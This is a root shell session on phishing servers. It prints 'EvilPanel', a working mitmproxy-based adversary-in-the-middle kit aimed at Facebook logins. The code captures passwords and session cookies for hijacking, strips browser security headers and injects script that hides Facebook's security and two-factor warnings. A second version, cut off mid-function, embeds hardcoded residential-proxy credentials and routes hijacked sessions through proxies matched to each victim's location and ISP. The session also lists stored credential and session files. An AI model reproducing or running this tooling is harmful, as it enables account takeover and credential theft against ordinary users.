root@maxphisher-vps:~# cat /opt/evilpanel/core/mitmproxy_addon.py
"""
EvilPanel mitmproxy Addon v3.0 - Production Ready
Based on 2025 Evilginx2/mitmproxy best practices

Features:
- Full credential capture from ALL endpoints (not just /login)
- Complete session token extraction (c_user, xs, fr, datr, sb, wd)
- React-safe security warning hiding (CSS injection, not DOM removal)
- Selective HTML-only URL rewriting (preserves JSON/JS integrity)
- Comprehensive security header stripping
- Dual storage: SQLite + JSON backup
"""
from mitmproxy import http, ctx
import json
import os
import re
import sqlite3
from datetime import datetime
from typing import Optional, Dict, List
from urllib.parse import urlparse, parse_qs
import hashlib

# Configuration from environment variables
DOMAIN = os.environ.get("EVILPANEL_DOMAIN", "whatsappqrscan.site")
DATA_DIR = os.environ.get("EVILPANEL_DATA", "/opt/evilpanel/data")
DB_PATH = os.path.join(DATA_DIR, "evilpanel.db")
DEBUG_MODE = os.environ.get("EVILPANEL_DEBUG", "true").lower() == "true"

# Security headers to strip (comprehensive 2025 list)
SECURITY_HEADERS = [
    "Content-Security-Policy",
    "Content-Security-Policy-Report-Only",
    "X-Content-Security-Policy",
    "X-WebKit-CSP",
    "X-Frame-Options",
    "Strict-Transport-Security",
    "X-XSS-Protection",
    "X-Content-Type-Options",
    "Permissions-Policy",
    "Cross-Origin-Embedder-Policy",
    "Cross-Origin-Opener-Policy",
    "Cross-Origin-Resource-Policy",
    "Report-To",
    "NEL",
]

# Facebook session tokens to capture (priority order)
FB_SESSION_TOKENS = {
    "critical": ["c_user", "xs"],  # REQUIRED for session hijacking
    "recommended": ["fr"],          # Device fingerprint
    "optional": ["datr", "sb", "wd", "presence", "spin"]  # Additional tokens
}

# Facebook credential field mappings
FB_CREDENTIAL_FIELDS = {
    "email": ["email", "username", "login_email", "id"],
    "password": ["pass", "password", "login_password", "pwd"]
}


class EvilPanelAddon:
    """
    Production-ready AiTM addon for Facebook credential and session capture.
    
    Request Flow:
    1. request() - Intercept requests, rewrite Host header, capture POST data
    2. response() - Strip headers, capture tokens, rewrite HTML, inject scripts
    
    Key Design Principles (2025 Best Practices):
    - HIDE, don't REMOVE DOM elements (React compatibility)
    - ONLY rewrite URLs in HTML href/action attributes
    - NEVER modify JSON/JavaScript responses (server validation)
    - Capture credentials from ALL POST endpoints
    - Log everything for debugging and analysis
    """
    
    def __init__(self):
        self.domain = DOMAIN
        self.data_dir = DATA_DIR
        self.session_id_counter = 0
        
        # Ensure data directory exists
        os.makedirs(self.data_dir, exist_ok=True)
        
        # Initialize database
        self._init_database()
        
        ctx.log.info(f"[EvilPanel] Initialized v3.0 for domain: {self.domain}")
        ctx.log.info(f"[EvilPanel] Data directory: {self.data_dir}")
        ctx.log.info(f"[EvilPanel] Debug mode: {DEBUG_MODE}")
    
    def _init_database(self):
        """Initialize SQLite database with required tables"""
        try:
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            
            # Credentials table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email TEXT NOT NULL,
                    password TEXT NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    fingerprint_id TEXT,
                    request_path TEXT,
                    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            # Sessions table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    c_user TEXT,
                    xs TEXT,
                    fr TEXT,
                    datr TEXT,
                    sb TEXT,
                    wd TEXT,
                    presence TEXT,
                    ip_address TEXT,
                    credential_id INTEGER,
                    all_cookies TEXT,
                    status TEXT DEFAULT 'active',
                    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (credential_id) REFERENCES credentials(id)
                )
            """)
            
            # Fingerprints table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS fingerprints (
                    id TEXT PRIMARY KEY,
                    ip_address TEXT,
                    user_agent TEXT,
                    screen_resolution TEXT,
                    timezone TEXT,
                    language TEXT,
                    platform TEXT,
                    webgl_vendor TEXT,
                    webgl_renderer TEXT,
                    canvas_hash TEXT,
                    raw_data TEXT,
                    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            # Request logs (for debugging)
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS request_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    method TEXT,
                    path TEXT,
                    content_type TEXT,
                    has_credentials INTEGER DEFAULT 0,
                    response_code INTEGER,
                    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            conn.commit()
            conn.close()
            ctx.log.info("[EvilPanel] Database initialized")
        except Exception as e:
            ctx.log.error(f"[EvilPanel] Database init error: {e}")
    
    def _debug_log(self, hypothesis_id: str, message: str, data: dict = None):
        """Write detailed debug log entry"""
        if not DEBUG_MODE:
            return
        try:
            log_entry = {
                "hypothesisId": hypothesis_id,
                "message": message,
                "data": data or {},
                "timestamp": int(datetime.utcnow().timestamp() * 1000)
            }
            log_path = os.path.join(self.data_dir, "debug.log")
            with open(log_path, "a") as f:
                f.write(json.dumps(log_entry) + "\n")
        except Exception:
            pass
    
    # ==================== REQUEST HANDLING ====================
    
    def request(self, flow: http.HTTPFlow) -> None:
        """
        Intercept and process incoming requests:
        1. Handle debug endpoint
        2. Rewrite Host header for domain mapping
        3. Capture credentials from POST requests
        """
        
        # Handle debug log endpoint from client-side JS
        if flow.request.path == "/debug-log" and flow.request.method == "POST":
            self._handle_debug_endpoint(flow)
            return
        
        # Handle fingerprint data endpoint
        if flow.request.path == "/api/fingerprint" and flow.request.method == "POST":
            self._handle_fingerprint_endpoint(flow)
            return
        
        # Rewrite Host header for domain routing
        self._rewrite_host_header(flow)
        
        # Capture credentials from ALL POST requests
        if flow.request.method == "POST":
            self._capture_credentials(flow)
    
    def _handle_debug_endpoint(self, flow: http.HTTPFlow):
        """Handle client-side debug log submissions"""
        try:
            client_log = json.loads(flow.request.content.decode())
            client_log["source"] = "client"
            log_path = os.path.join(self.data_dir, "debug.log")
            with open(log_path, "a") as f:
                f.write(json.dumps(client_log) + "\n")
        except Exception:
            pass
        flow.response = http.Response.make(200, b"ok", {"Content-Type": "text/plain"})
    
    def _handle_fingerprint_endpoint(self, flow: http.HTTPFlow):
        """Handle fingerprint data from landing page"""
        try:
            fingerprint = json.loads(flow.request.content.decode())
            self._save_fingerprint(fingerprint, flow)
            flow.response = http.Response.make(200, b'{"status": "ok"}', 
                                               {"Content-Type": "application/json"})
        except Exception as e:
            ctx.log.error(f"[EvilPanel] Fingerprint error: {e}")
            flow.response = http.Response.make(400, b'{"status": "error"}',
                                               {"Content-Type": "application/json"})
    
    def _rewrite_host_header(self, flow: http.HTTPFlow):
        """
        Rewrite Host header from our phishing domain to real Facebook domain.
        
        Mappings:
        - m.whatsappqrscan.site → m.facebook.com
        - www.whatsappqrscan.site → www.facebook.com
        - whatsappqrscan.site → www.facebook.com
        """
        host = flow.request.host
        
        if host.endswith(self.domain):
            subdomain = host.replace(f".{self.domain}", "").replace(self.domain, "")
            
            mapping = {
                "m": "m.facebook.com",
                "www": "www.facebook.com",
                "": "www.facebook.com",
                "login": "www.facebook.com",
                "static": "static.xx.fbcdn.net",
            }
            
            target = mapping.get(subdomain, "m.facebook.com")
            flow.request.host = target
            flow.request.headers["Host"] = target
            
            self._debug_log("HOST", "rewrite", {
                "from": host,
                "to": target,
                "subdomain": subdomain
            })
    
    def _capture_credentials(self, flow: http.HTTPFlow):
        """
        Extract credentials from POST request body.
        
        Facebook uses various endpoints for login:
        - /login.php (traditional)
        - /login/ (mobile)
        - /api/graphql/ (modern React)
        - /ajax/login/ (AJAX)
        """
        try:
            content_type = flow.request.headers.get("Content-Type", "")
            
            email = None
            password = None
            
            # Handle form-urlencoded data
            if "form" in content_type or "urlencoded" in content_type:
                data = dict(flow.request.urlencoded_form)
                
                # Find email/username
                for field in FB_CREDENTIAL_FIELDS["email"]:
                    if field in data and data[field]:
                        email = data[field]
                        break
                
                # Find password
                for field in FB_CREDENTIAL_FIELDS["password"]:
                    if field in data and data[field]:
                        password = data[field]
                        break
            
            # Handle JSON data (GraphQL endpoints)
            elif "json" in content_type:
                try:
                    data = json.loads(flow.request.content.decode())
                    
                    # Handle nested structures
                    if isinstance(data, dict):
                        # Direct fields
                        for field in FB_CREDENTIAL_FIELDS["email"]:
                            if field in data:
                                email = data[field]
                                break
                        for field in FB_CREDENTIAL_FIELDS["password"]:
                            if field in data:
                                password = data[field]
                                break
                        
                        # Check variables (GraphQL)
                        if "variables" in data and isinstance(data["variables"], dict):
                            vars_data = data["variables"]
                            if not email:
                                for field in FB_CREDENTIAL_FIELDS["email"]:
                                    if field in vars_data:
                                        email = vars_data[field]
                                        break
                            if not password:
                                for field in FB_CREDENTIAL_FIELDS["password"]:
                                    if field in vars_data:
                                        password = vars_data[field]
                                        break
                except Exception:
                    pass
            
            # Save if we captured credentials
            if email and password:
                ctx.log.info(f"[CREDENTIAL] Captured: {email}")
                self._save_credential(email, password, flow)
                self._debug_log("CRED", "captured", {
                    "email": email[:3] + "***",  # Partial for logging
                    "path": flow.request.path
                })
        
        except Exception as e:
            ctx.log.error(f"[EvilPanel] Credential capture error: {e}")
    
    # ==================== RESPONSE HANDLING ====================
    
    def response(self, flow: http.HTTPFlow) -> None:
        """
        Process responses:
        1. Strip security headers
        2. Capture session tokens from cookies
        3. Rewrite redirect Location headers
        4. Rewrite cookie domains
        5. Rewrite URLs in HTML only
        6. Inject security warning hider script
        """
        
        # 1. Strip ALL security headers
        self._strip_security_headers(flow)
        
        # 2. Capture session tokens
        self._capture_tokens(flow)
        
        # 3. Rewrite redirect Location headers
        self._rewrite_redirect(flow)
        
        # 4. Rewrite cookie domains
        self._rewrite_cookie_domains(flow)
        
        # 5. Rewrite response content (HTML only)
        self._rewrite_response(flow)
    
    def _strip_security_headers(self, flow: http.HTTPFlow):
        """Remove all security headers that would block our proxy"""
        removed = []
        for header in SECURITY_HEADERS:
            if header in flow.response.headers:
                del flow.response.headers[header]
                removed.append(header)
        
        if removed:
            self._debug_log("HEADERS", "stripped", {"removed": removed})
    
    def _capture_tokens(self, flow: http.HTTPFlow):
        """
        Extract Facebook session tokens from Set-Cookie headers.
        
        Critical tokens:
        - c_user: User ID (REQUIRED)
        - xs: Session token (REQUIRED)
        - fr: Device fingerprint
        - datr, sb, wd: Additional session data
        """
        try:
            cookies = flow.response.cookies
            captured = {}
            
            # Collect all FB tokens
            all_token_names = (
                FB_SESSION_TOKENS["critical"] + 
                FB_SESSION_TOKENS["recommended"] + 
                FB_SESSION_TOKENS["optional"]
            )
            
            for name in all_token_names:
                if name in cookies:
                    value = cookies[name]
                    captured[name] = value[0] if isinstance(value, tuple) else value
            
            # Check if we have critical tokens
            has_critical = all(k in captured for k in FB_SESSION_TOKENS["critical"])
            
            if has_critical:
                ctx.log.info(f"[SESSION] Captured tokens: {list(captured.keys())}")
                self._save_session(captured, flow)
                self._debug_log("SESSION", "captured", {
                    "tokens": list(captured.keys()),
                    "c_user": captured.get("c_user", "N/A")[:10] + "..."
                })
        
        except Exception as e:
            ctx.log.error(f"[EvilPanel] Token capture error: {e}")
    
    def _rewrite_redirect(self, flow: http.HTTPFlow):
        """Rewrite Location header for 3xx redirects"""
        if flow.response.status_code in [301, 302, 303, 307, 308]:
            location = flow.response.headers.get("Location", "")
            if location:
                new_location = self._rewrite_url(location)
                if new_location != location:
                    flow.response.headers["Location"] = new_location
                    self._debug_log("REDIRECT", "rewritten", {
                        "from": location[:80],
                        "to": new_location[:80]
                    })
    
    def _rewrite_cookie_domains(self, flow: http.HTTPFlow):
        """Rewrite cookie domains from .facebook.com to our domain"""
        if "Set-Cookie" in flow.response.headers:
            new_cookies = []
            for cookie in flow.response.headers.get_all("Set-Cookie"):
                # Replace Facebook domain with our domain
                new_cookie = cookie.replace("domain=.facebook.com", f"domain=.{self.domain}")
                new_cookie = new_cookie.replace("domain=facebook.com", f"domain={self.domain}")
                new_cookies.append(new_cookie)
            
            del flow.response.headers["Set-Cookie"]
            for cookie in new_cookies:
                flow.response.headers.add("Set-Cookie", cookie)
    
    def _rewrite_url(self, url: str) -> str:
        """Rewrite a Facebook URL to our phishing domain"""
        url = url.replace("m.facebook.com", f"m.{self.domain}")
        url = url.replace("www.facebook.com", f"www.{self.domain}")
        url = url.replace("facebook.com", self.domain)
        return url
    
    def _rewrite_response(self, flow: http.HTTPFlow):
        """
        Rewrite Facebook URLs in response content.
        
        CRITICAL: Only rewrite in HTML, not JSON/JavaScript!
        Facebook validates URLs server-side, modifying them in API responses
        will cause authentication failures.
        """
        if not flow.response.content:
            return
        
        try:
            content_type = flow.response.headers.get("Content-Type", "")
            
            # SKIP: JSON responses (server-validated URLs)
            if "json" in content_type.lower():
                return
            
            # SKIP: JavaScript (URL validation logic)
            if "javascript" in content_type.lower():
                return
            
            # SKIP: Non-HTML content
            if "text/html" not in content_type.lower():
                return
            
            content = flow.response.content.decode('utf-8', errors='ignore')
            
            # === HTML URL REWRITING ===
            # Only rewrite href and action attributes
            
            # Rewrite href attributes
            content = re.sub(
                r'href="https?://m\.facebook\.com([^"]*)"',
                f'href="https://m.{self.domain}\\1"',
                content
            )
            content = re.sub(
                r'href="https?://www\.facebook\.com([^"]*)"',
                f'href="https://www.{self.domain}\\1"',
                content
            )
            content = re.sub(
                r'href="https?://facebook\.com([^"]*)"',
                f'href="https://{self.domain}\\1"',
                content
            )
            
            # Rewrite action attributes (form submissions)
            content = re.sub(
                r'action="https?://m\.facebook\.com([^"]*)"',
                f'action="https://m.{self.domain}\\1"',
                content
            )
            content = re.sub(
                r'action="https?://www\.facebook\.com([^"]*)"',
                f'action="https://www.{self.domain}\\1"',
                content
            )
            
            # === INJECT SECURITY WARNING HIDER ===
            if "</body>" in content:
                content = content.replace("</body>", f"{self._get_warning_hider_script()}</body>")
            
            flow.response.content = content.encode('utf-8')
            
            self._debug_log("REWRITE", "html_processed", {
                "path": flow.request.path[:50],
                "size": len(content)
            })
        
        except Exception as e:
            ctx.log.error(f"[EvilPanel] Response rewrite error: {e}")
    
    def _get_warning_hider_script(self) -> str:
        """
        Generate JavaScript to hide Facebook's security warning.
        
        2025 Technique: CSS hiding instead of DOM removal
        - React requires DOM nodes to exist for Virtual DOM reconciliation
        - Removing nodes causes: "Failed to execute 'removeChild'"
        - CSS hiding is invisible to users but keeps React happy
        """
        return '''
<script>
(function() {
    'use strict';
    
    // Debug logging to server
    var debugLog = function(hyp, msg, data) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/debug-log', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                hypothesisId: hyp,
                message: msg,
                data: data || {},
                timestamp: Date.now(),
                url: location.href
            }));
        } catch(e) {}
    };
    
    // Security warning text patterns
    var warningPatterns = [
        'never enter your Facebook password',
        'Security Notice',
        'For your security',
        'suspicious login',
        'Login Approval',
        'Enter Security Code',
        'Two-factor authentication'
    ];
    
    // Check if element contains warning text
    var containsWarning = function(el) {
        var text = (el.textContent || el.innerText || '').toLowerCase();
        for (var i = 0; i < warningPatterns.length; i++) {
            if (text.indexOf(warningPatterns[i].toLowerCase()) !== -1) {
                return true;
            }
        }
        return false;
    };
    
    // Hide element with aggressive CSS (not remove!)
    var hideElement = function(el) {
        if (!el || el.dataset.evpHidden) return;
        
        el.style.cssText = [
            'display: none !important',
            'visibility: hidden !important',
            'opacity: 0 !important',
            'pointer-events: none !important',
            'position: absolute !important',
            'left: -9999px !important',
            'top: -9999px !important',
            'width: 0 !important',
            'height: 0 !important',
            'overflow: hidden !important',
            'clip: rect(0,0,0,0) !important'
        ].join('; ');
        
        // Mark as hidden to avoid reprocessing
        el.dataset.evpHidden = 'true';
        
        // Also hide children
        var children = el.querySelectorAll('*');
        for (var i = 0; i < children.length; i++) {
            children[i].style.cssText = 'display:none !important; visibility:hidden !important;';
        }
    };
    
    // Find and hide security warning containers
    var hideWarnings = function() {
        var found = false;
        
        // Method 1: Check all elements for warning text
        var allElements = document.querySelectorAll('*');
        for (var i = 0; i < allElements.length; i++) {
            var el = allElements[i];
            if (el.tagName === 'SCRIPT' || el.tagName === 'STYLE') continue;
            
            if (containsWarning(el)) {
                // Walk up to find container (dialog, modal, overlay)
                var parent = el;
                for (var j = 0; j < 15; j++) {
                    if (!parent.parentElement) break;
                    parent = parent.parentElement;
                    
                    var role = parent.getAttribute('role');
                    var cls = (parent.className || '').toLowerCase();
                    
                    // Check for dialog/modal indicators
                    if (role === 'dialog' || role === 'alertdialog' ||
                        cls.indexOf('modal') !== -1 ||
                        cls.indexOf('overlay') !== -1 ||
                        cls.indexOf('dialog') !== -1 ||
                        cls.indexOf('popup') !== -1) {
                        
                        debugLog('H8', 'hiding_container', {
                            tag: parent.tagName,
                            role: role,
                            className: cls.substring(0, 60)
                        });
                        
                        hideElement(parent);
                        found = true;
                        break;
                    }
                }
            }
        }
        
        // Method 2: Check for common dialog selectors
        var dialogSelectors = [
            '[role="dialog"]',
            '[role="alertdialog"]',
            '[data-testid="dialog_root"]',
            '.modal',
            '.overlay'
        ];
        
        dialogSelectors.forEach(function(selector) {
            try {
                var elements = document.querySelectorAll(selector);
                elements.forEach(function(el) {
                    if (containsWarning(el)) {
                        hideElement(el);
                        found = true;
                    }
                });
            } catch(e) {}
        });
        
        return found;
    };
    
    // Initial execution
    debugLog('H6', 'script_loaded', {time: 0, url: location.href});
    
    // Check multiple times (React async rendering)
    var checkTimes = [100, 500, 1000, 2000, 3000, 5000, 8000, 10000, 15000, 20000];
    checkTimes.forEach(function(t) {
        setTimeout(function() {
            var result = hideWarnings();
            if (!result) {
                debugLog('H6', 'no_warning_at', {time: t + 'ms'});
            }
        }, t);
    });
    
    // MutationObserver for dynamic content
    var observer = new MutationObserver(function(mutations) {
        for (var i = 0; i < mutations.length; i++) {
            var mutation = mutations[i];
            for (var j = 0; j < mutation.addedNodes.length; j++) {
                var node = mutation.addedNodes[j];
                if (node.nodeType === 1 && containsWarning(node)) {
                    debugLog('H8', 'mutation_detected', {
                        tag: node.tagName,
                        text: (node.textContent || '').substring(0, 80)
                    });
                    setTimeout(hideWarnings, 50);
                    setTimeout(hideWarnings, 200);
                    return;
                }
            }
        }
    });
    
    observer.observe(document.documentElement, {
        childList: true,
        subtree: true
    });
    
    // Continuous monitoring (React re-renders)
    var hideInterval = setInterval(hideWarnings, 500);
    setTimeout(function() { clearInterval(hideInterval); }, 30000);
})();
</script>
'''
    
    # ==================== DATA STORAGE ====================
    
    def _save_credential(self, email: str, password: str, flow: http.HTTPFlow):
        """Save captured credential to database and JSON backup"""
        try:
            ip = flow.client_conn.peername[0] if flow.client_conn.peername else "unknown"
            ua = flow.request.headers.get("User-Agent", "")
            path = flow.request.path
            timestamp = datetime.utcnow().isoformat()
            
            # JSON backup
            record = {
                "timestamp": timestamp,
                "email": email,
                "password": password,
                "ip": ip,
                "user_agent": ua,
                "request_path": path
            }
            json_path = os.path.join(self.data_dir, "credentials.json")
            with open(json_path, "a") as f:
                f.write(json.dumps(record) + "\n")
            
            # SQLite storage
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute(
                """INSERT INTO credentials 
                   (email, password, ip_address, user_agent, request_path)
                   VALUES (?, ?, ?, ?, ?)""",
                (email, password, ip, ua, path)
            )
            conn.commit()
            conn.close()
            
            ctx.log.info(f"[SAVED] Credential: {email}")
        
        except Exception as e:
            ctx.log.error(f"[EvilPanel] Save credential error: {e}")
    
    def _save_session(self, tokens: dict, flow: http.HTTPFlow):
        """Save captured session tokens to database and JSON backup"""
        try:
            ip = flow.client_conn.peername[0] if flow.client_conn.peername else "unknown"
            timestamp = datetime.utcnow().isoformat()
            
            # JSON backup
            record = {
                "timestamp": timestamp,
                "tokens": tokens,
                "ip": ip,
                "all_cookies": json.dumps(tokens)
            }
            json_path = os.path.join(self.data_dir, "sessions.json")
            with open(json_path, "a") as f:
                f.write(json.dumps(record) + "\n")
            
            # SQLite storage
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute(
                """INSERT INTO sessions 
                   (c_user, xs, fr, datr, sb, wd, presence, ip_address, all_cookies)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (
                    tokens.get("c_user", ""),
                    tokens.get("xs", ""),
                    tokens.get("fr", ""),
                    tokens.get("datr", ""),
                    tokens.get("sb", ""),
                    tokens.get("wd", ""),
                    tokens.get("presence", ""),
                    ip,
                    json.dumps(tokens)
                )
            )
            conn.commit()
            conn.close()
            
            ctx.log.info(f"[SAVED] Session: c_user={tokens.get('c_user', 'N/A')}")
        
        except Exception as e:
            ctx.log.error(f"[EvilPanel] Save session error: {e}")
    
    def _save_fingerprint(self, fingerprint: dict, flow: http.HTTPFlow):
        """Save fingerprint data from landing page"""
        try:
            ip = flow.client_conn.peername[0] if flow.client_conn.peername else "unknown"
            
            # Generate fingerprint ID
            fp_id = hashlib.sha256(json.dumps(fingerprint, sort_keys=True).encode()).hexdigest()[:16]
            
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute(
                """INSERT OR REPLACE INTO fingerprints
                   (id, ip_address, user_agent, screen_resolution, timezone, 
                    language, platform, webgl_vendor, webgl_renderer, canvas_hash, raw_data)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (
                    fp_id,
                    ip,
                    fingerprint.get("userAgent", ""),
                    fingerprint.get("screenResolution", ""),
                    fingerprint.get("timezone", ""),
                    fingerprint.get("language", ""),
                    fingerprint.get("platform", ""),
                    fingerprint.get("webglVendor", ""),
                    fingerprint.get("webglRenderer", ""),
                    fingerprint.get("canvasHash", ""),
                    json.dumps(fingerprint)
                )
            )
            conn.commit()
            conn.close()
            
            ctx.log.info(f"[SAVED] Fingerprint: {fp_id}")
        
        except Exception as e:
            ctx.log.error(f"[EvilPanel] Save fingerprint error: {e}")


# mitmproxy entry point
addons = [EvilPanelAddon()]
root@maxphisher-vps:~#



---



*** System restart required ***
Last login: Thu Dec  4 13:29:00 2025 from 198.211.111.194
root@ubuntu-s-2vcpu-4gb-120gb-intel-sgp1-01:~# ls
root@ubuntu-s-2vcpu-4gb-120gb-intel-sgp1-01:~# ls -la
total 40
drwx------  5 root root 4096 Dec  3 21:06 .
drwxr-xr-x 22 root root 4096 Dec  3 04:07 ..
-rw-------  1 root root 1333 Dec  3 21:36 .bash_history
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
drwx------  3 root root 4096 Dec  3 05:24 .cache
-rw-r--r--  1 root root    0 Dec  3 04:07 .cloud-locale-test.skip
-rw-------  1 root root   20 Dec  3 21:06 .lesshst
drwxr-xr-x  2 root root 4096 Dec  3 05:27 .mitmproxy
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
drwx------  2 root root 4096 Dec  6 11:02 .ssh
-rw-r--r--  1 root root  185 Dec  6 10:26 .wget-hsts
root@ubuntu-s-2vcpu-4gb-120gb-intel-sgp1-01:~# ssh -i /home/haymayndz/.ssh/id_ed25519_maxphisher -o ConnectTimeout=10 -o StrictHostKeyChecking=no root@206.189.92.6 "ls -la /opt/evilpanel/data/"
Warning: Identity file /home/haymayndz/.ssh/id_ed25519_maxphisher not accessible: No such file or directory.
Warning: Permanently added '206.189.92.6' (ED25519) to the list of known hosts.
root@206.189.92.6: Permission denied (publickey).
root@ubuntu-s-2vcpu-4gb-120gb-intel-sgp1-01:~# ls -la /opt/evilpanel/data/
total 728
drwx------  2 root root   4096 Dec  4 07:50 .
drwxr-xr-x 11 1000 1000   4096 Dec  4 08:09 ..
-rw-r--r--  1 root root   1026 Dec  4 07:49 credentials.json
-rw-r--r--  1 root root 645588 Dec  4 08:01 debug.log
-rw-r--r--  1 root root  73728 Dec  4 07:50 evilpanel.db
-rw-r--r--  1 root root    255 Dec  4 07:43 sessions.json
root@ubuntu-s-2vcpu-4gb-120gb-intel-sgp1-01:~# cat sessions.json
cat: sessions.json: No such file or directory
root@ubuntu-s-2vcpu-4gb-120gb-intel-sgp1-01:~# ^C
root@ubuntu-s-2vcpu-4gb-120gb-intel-sgp1-01:~# cd ls -la /opt/evilpanel/data/
-bash: cd: too many arguments
root@ubuntu-s-2vcpu-4gb-120gb-intel-sgp1-01:~# ^C
root@ubuntu-s-2vcpu-4gb-120gb-intel-sgp1-01:~# cd ls -la /opt/evilpanel/data/
-bash: cd: too many arguments
root@ubuntu-s-2vcpu-4gb-120gb-intel-sgp1-01:~# cd /opt/evilpanel/data/
root@ubuntu-s-2vcpu-4gb-120gb-intel-sgp1-01:/opt/evilpanel/data# cat sessions.json
{"timestamp": "2025-12-04T07:43:30.151162", "tokens": {"c_user": "TEST_USER_12345", "xs": "TEST_XS_TOKEN_ABC123", "fr": "TEST_FR_TOKEN", "datr": "TEST_DATR_TOKEN", "sb": "TEST_SB_TOKEN", "wd": "1920x1080"}, "ip": "127.0.0.1", "source": "SIMULATION_TEST"}
root@ubuntu-s-2vcpu-4gb-120gb-intel-sgp1-01:/opt/evilpanel/data# cat /opt/evilpanel/core/mitmproxy_addon.py
"""
EvilPanel mitmproxy Addon v6.0
- Smart geo-proxy with ASN priority
- Automatic fallback (zip → city → state, keep ASN)
- Saves best working proxy with each capture
"""

import os
import json
import sqlite3
import subprocess
from datetime import datetime
from mitmproxy import http, ctx

# ========== CONFIG ==========
DOMAIN = os.environ.get("EVILPANEL_DOMAIN", "NEWDOMAIN_PLACEHOLDER")
DATA_DIR = os.environ.get("EVILPANEL_DATA", "/opt/evilpanel/data")
DB_PATH = os.path.join(DATA_DIR, "evilpanel.db")

DI_USER = "768b27aac68d92f840d9"
DI_PASS = "b7564921f7b4962f"
DI_HOST = "gw.dataimpulse.com"
DI_PORT = 10000

_geo_cache = {}

# ========== GEO FUNCTIONS ==========
def get_geo(ip):
    if ip in _geo_cache:
        return _geo_cache[ip]
    if ip.startswith("127.") or ip.startswith("10.") or ip.startswith("192.168."):
        return None
    try:
        result = subprocess.run(
            ["curl", "-s", "--connect-timeout", "2",
             f"http://ip-api.com/json/{ip}?fields=status,countryCode,regionName,city,zip,isp,as,mobile"],
            capture_output=True, text=True, timeout=4
        )
        data = json.loads(result.stdout)
        if data.get("status") != "success":
            return None
        
        as_full = data.get("as", "")
        asn = as_full.split()[0][2:] if as_full.startswith("AS") else ""
        
        def clean(v):
            return ''.join(c for c in str(v).lower() if c.isalnum()) if v else ""
        
        geo = {
            "country": data.get("countryCode", "").lower(),
            "state": clean(data.get("regionName", "")),
            "city": clean(data.get("city", "")),
            "zip": clean(data.get("zip", "")),
            "asn": asn,
            "isp": data.get("isp", ""),
            "mobile": data.get("mobile", False)
        }
        _geo_cache[ip] = geo
        return geo
    except:
        return None


def build_proxy_levels(geo):
    """Build proxy list from most specific to least. ASN always included."""
    if not geo:
        return [(f"socks5://{DI_USER}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "BASE")]
    
    c = geo.get("country", "")
    a = geo.get("asn", "")
    s = geo.get("state", "")
    ci = geo.get("city", "")
    z = geo.get("zip", "")
    
    levels = []
    
    # Level 1: FULL
    if a and s and ci and z:
        params = f"cr.{c};asn.{a};state.{s};city.{ci};zip.{z}"
        levels.append((f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "FULL"))
    
    # Level 2: NO_ZIP
    if a and s and ci:
        params = f"cr.{c};asn.{a};state.{s};city.{ci}"
        levels.append((f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "NO_ZIP"))
    
    # Level 3: NO_CITY
    if a and s:
        params = f"cr.{c};asn.{a};state.{s}"
        levels.append((f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "NO_CITY"))
    
    # Level 4: ASN_ONLY (minimum for fingerprint matching)
    if a:
        params = f"cr.{c};asn.{a}"
        levels.append((f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "ASN_ONLY"))
    
    # Level 5: COUNTRY_ONLY
    if c:
        params = f"cr.{c}"
        levels.append((f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "COUNTRY_ONLY"))
    
    # Level 6: BASE
    levels.append((f"socks5://{DI_USER}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "BASE"))
    
    return levels


# ========== MAIN ADDON ==========
class EvilPanelAddon:
    def __init__(self):
        self.domain = DOMAIN
        self._init_db()
        ctx.log.info(f"[EvilPanel v6.0] Smart Geo-Proxy with ASN Priority")

    def _init_db(self):
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("""CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY, email TEXT, password TEXT,
                ip_address TEXT, user_agent TEXT, geo_json TEXT,
                proxy_url TEXT, proxy_level TEXT,
                captured_at DATETIME DEFAULT CURRENT_TIMESTAMP)""")
            conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY, c_user TEXT, xs TEXT, fr TEXT,
                datr TEXT, sb TEXT, wd TEXT, ip_address TEXT, geo_json TEXT,
                proxy_url TEXT, proxy_level TEXT,
                captured_at DATETIME DEFAULT CURRENT_TIMESTAMP)""")
            conn.commit()
            conn.close()
        except Exception as e:
            ctx.log.error(f"[DB] {e}")

    def request(self, flow: http.HTTPFlow):
        target_ip = flow.client_conn.peername[0] if flow.client_conn.peername else "unknown"
        
        geo = None
        proxy_url = ""
        proxy_level = "BASE"
        
        if not target_ip.startswith("127."):
            geo = get_geo(target_ip)
            if geo:
